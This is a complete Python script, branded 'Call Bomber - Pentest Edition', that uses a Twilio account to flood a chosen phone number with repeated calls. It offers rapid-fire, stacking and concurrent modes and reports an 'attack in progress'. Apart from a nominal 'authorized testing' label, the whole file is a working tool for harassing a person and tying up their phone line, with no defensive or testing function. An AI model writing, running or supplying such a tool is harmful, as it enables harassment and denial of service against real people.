#!/usr/bin/env python3

import os
import sys
import time
import random

try:
    from twilio.rest import Client
except ImportError:
    print("\n[!] Installing twilio...")
    os.system("pip install twilio -q")
    from twilio.rest import Client

# ─── Clear Screen ───
os.system("cls" if os.name == "nt" else "clear")

# ─── BANNER ───
BANNER = r"""
____    _    _     _        ____   ___   ___  __  __ _____ ____
 / ___|  / \  | |   | |      | __ ) / _ \ / _ \|  \/  | ____|  _ \
| |     / _ \ | |   | |      |  _ \| | | | | | | |\/| |  _| | |_) |
| |___ / ___ \| |___| |___   | |_) | |_| | |_| | |  | | |___|  _ <
 \____/_/   \_\_____|_____|  |____/ \___/ \___/|_|  |_|_____|_| \_\

███╗   ███╗ █████╗ ██████╗ ███████╗    ██████╗ ██╗   ██╗
████╗ ████║██╔══██╗██╔══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝
██╔████╔██║███████║██║  ██║█████╗      ██████╔╝ ╚████╔╝
██║╚██╔╝██║██╔══██║██║  ██║██╔══╝      ██╔══██╗  ╚██╔╝
██║ ╚═╝ ██║██║  ██║██████╔╝███████╗    ██████╔╝   ██║
╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝    ╚═════╝    ╚═╝

████████╗ ██████╗ ██╗  ██╗██╗ ██████╗
╚══██╔══╝██╔═══██╗╚██╗██╔╝██║██╔════╝
   ██║   ██║   ██║ ╚███╔╝ ██║██║
   ██║   ██║   ██║ ██╔██╗ ██║██║
   ██║   ╚██████╔╝██╔╝ ██╗██║╚██████╗
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝ ╚═════╝
"""

# ─── Colors ───
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"
BOLD = "\033[1m"

def log(msg, color=WHITE):
    print(f"{color}{msg}{RESET}")

def type_effect(text, delay=0.02):
    for c in text:
        print(c, end="", flush=True)
        time.sleep(delay)
    print()

# ─── MAIN ───
print(f"{GREEN}{BANNER}{RESET}")
log("══════════════════════════════════════════════", CYAN)
log("         CALL BOMBER - PENTEST EDITION        ", CYAN)
log("       Authorized Security Testing Tool       ", CYAN)
log("══════════════════════════════════════════════", CYAN)

# ─── Auth ───
log("\n[>] Twilio Credentials Required", YELLOW)

sid = input(f"{BOLD}SID{RESET}: ").strip()
token = input(f"{BOLD}Token{RESET}: ").strip()

if not sid: sid = os.environ.get("TWILIO_SID", "")
if not token: token = os.environ.get("TWILIO_TOKEN", "")

if not sid or not token:
    log("[!] No credentials. Exiting.", RED)
    sys.exit(1)

log("[*] Authenticating...", YELLOW)
try:
    client = Client(sid, token)
    account = client.api.accounts(sid).fetch()
    log(f"[+] Authenticated as: {account.friendly_name}", GREEN)
except Exception as e:
    log(f"[!] Auth failed: {e}", RED)
    sys.exit(1)

# ─── Target ───
log("\n[>] Target Information", YELLOW)
cc = input(f"{BOLD}Country Code{RESET} [+91]: ").strip() or "91"
num = input(f"{BOLD}Phone Number{RESET}: ").strip()
from_num = input(f"{BOLD}Your Twilio # (From){RESET}: ").strip()

if not num or not from_num:
    log("[!] Missing number. Exiting.", RED)
    sys.exit(1)

target = f"+{cc}{num}" if not num.startswith("+") else num

# ─── Settings ───
log("\n[>] Attack Configuration", YELLOW)
count = int(input(f"{BOLD}Calls{RESET} [20]: ").strip() or "20")
delay = float(input(f"{BOLD}Delay (sec){RESET} [0.5]: ").strip() or "0.5")

log("\n[>] Select Mode:", YELLOW)
log("  1. Rapid Fire  (call -> hangup -> repeat)", WHITE)
log("  2. Stack       (calls pile up on target)", WHITE)
log("  3. Concurrent  (full flood)", WHITE)
mode_choice = input(f"{BOLD}Mode{RESET} [1]: ").strip() or "1"
modes = {"1": "RAPID FIRE", "2": "STACK", "3": "CONCURRENT"}
mode = modes.get(mode_choice, "RAPID FIRE")

# ─── Confirm ───
log("\n══════════════════════════════════════════════", CYAN)
log(f"  TARGET  : {target}", GREEN)
log(f"  FROM    : {from_num}", GREEN)
log(f"  CALLS   : {count}", GREEN)
log(f"  DELAY   : {delay}s", GREEN)
log(f"  MODE    : {mode}", GREEN)
log("══════════════════════════════════════════════", CYAN)

input(f"\n{BOLD}[ PRESS ENTER TO LAUNCH ]{RESET}")

# ─── LAUNCH ───
log("\n[!] ATTACK IN PROGRESS", RED)
log("[!] Target: " + target, RED)
log("──────────────────────────────────────────", YELLOW)

success = 0
failed = 0

try:
    for i in range(1, count + 1):
        try:
            call = client.calls.create(
                url="http://demo.twilio.com/docs/voice.xml",
                to=target,
                from_=from_num,
                timeout=30
            )
            success += 1
            sid_short = str(call.sid)[:10]
            log(f"[+] CALL {i:>3}/{count}  |  SID: {sid_short}...  |  SUCCESS: {success}  |  FAILED: {failed}", GREEN)
            
            if mode == "RAPID FIRE":
                time.sleep(1.5)
                try:
                    client.calls(call.sid).update(status="completed")
                except:
                    pass
                time.sleep(max(0, delay - 1.5))
            elif mode == "STACK":
                time.sleep(8)
                time.sleep(delay)
            else:
                time.sleep(delay)
                
        except Exception as e:
            failed += 1
            log(f"[-] CALL {i:>3}/{count}  FAILED  |  {str(e)[:40]}", RED)
            time.sleep(delay)
            
except KeyboardInterrupt:
    log("\n[!] ABORTED BY OPERATOR", RED)

# ─── FINAL ───
log("──────────────────────────────────────────", YELLOW)
log(f"[+] ATTACK COMPLETE", GREEN)
log(f"[+] Successful: {success}  |  Failed: {failed}", CYAN)
log("══════════════════════════════════════════════", CYAN)
